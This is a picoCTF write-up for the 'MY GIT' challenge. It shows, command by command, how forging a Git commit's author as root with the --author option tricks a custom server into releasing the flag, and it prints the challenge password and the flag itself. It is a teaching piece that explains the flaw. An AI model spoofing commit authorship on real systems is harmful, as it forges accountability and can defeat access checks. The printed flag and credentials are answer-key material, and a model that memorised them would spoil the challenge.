# picoCTF — MY GIT

> **Category:** General Skills / Git
> **Challenge:** MY GIT
> **Platform:** picoCTF

## Challenge Description

> I have built my own Git server with my own rules!
>
> You can clone the challenge repo using the command below.
>
> ```bash
> git clone ssh://git@foggy-cliff.picoctf.net:50968/git/challenge.git
> ```
>
> **Password:** `d9df7038`
>
> Check the README to get your flag!

---

## 1. Clone the Repository

First, clone the challenge repository:

```bash
git clone ssh://git@foggy-cliff.picoctf.net:50968/git/challenge.git
```

When prompted for the password, use:

```text
d9df7038
```

Then enter the repository:

```bash
cd challenge
```

---

## 2. Inspect the README

The repository contains a `README.md` file.

```bash
cat README.md
```

The contents were:

````text
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
````

The important part is:

> **Only `flag.txt` pushed by `root:root@picoctf` will be updated with the flag.**

This suggests that the server checks the **Git commit author**, rather than verifying that the person pushing the commit is actually the `root` user.

---

## 3. Impersonate the Root Author

Git allows us to specify the author of a commit using the `--author` option.

First, create the required `flag.txt`:

```bash
echo test > flag.txt
```

Add it to the Git staging area:

```bash
git add flag.txt
```

Now create a commit while impersonating the required author:

```bash
git commit --author="root <root@picoctf>" -m "add flag"
```

The important part is:

```text
root <root@picoctf>
```

We are telling Git that the commit was authored by `root`, even though we are not actually authenticated as the root user.

---

## 4. Push the Commit

Finally, push the commit to the remote repository:

```bash
git push
```

The server accepted the commit and responded:

```text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
```

The SSH post-quantum warning is unrelated to the challenge and can be ignored.

---

## 5. Flag

```text
picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
```

---

## Why This Worked

The challenge relies on a distinction between **Git commit identity** and **authentication identity**.

Git commits contain metadata such as:

```text
Author: root <root@picoctf>
```

The `--author` option allows a user to set this metadata to an arbitrary identity.

For example:

```bash
git commit --author="root <root@picoctf>" -m "add flag"
```

This does **not** make us the actual root account. It only makes the commit claim that `root` was the author.

The custom Git server apparently trusted the commit's author field instead of verifying that the authenticated user was actually authorized to act as `root`.

Therefore, we could satisfy the server's condition simply by creating a commit with:

```text
root <root@picoctf>
```

and including `flag.txt`.

---

## Exploit Summary

The entire solution can be summarized as:

```bash
git clone ssh://git@foggy-cliff.picoctf.net:50968/git/challenge.git
cd challenge
echo test > flag.txt
git add flag.txt
git commit --author="root <root@picoctf>" -m "add flag"
git push
```

### Key Takeaway

> **Git commit authorship is metadata, not authentication.**

Never use a commit's `Author` field as proof that a particular user actually performed an action. Authorization should be based on the authenticated identity, not on user-controlled Git metadata.

---

## Flag

🏁 **`picoCTF{1mp3rs0n4t4_g17_345y_e522152d}`**
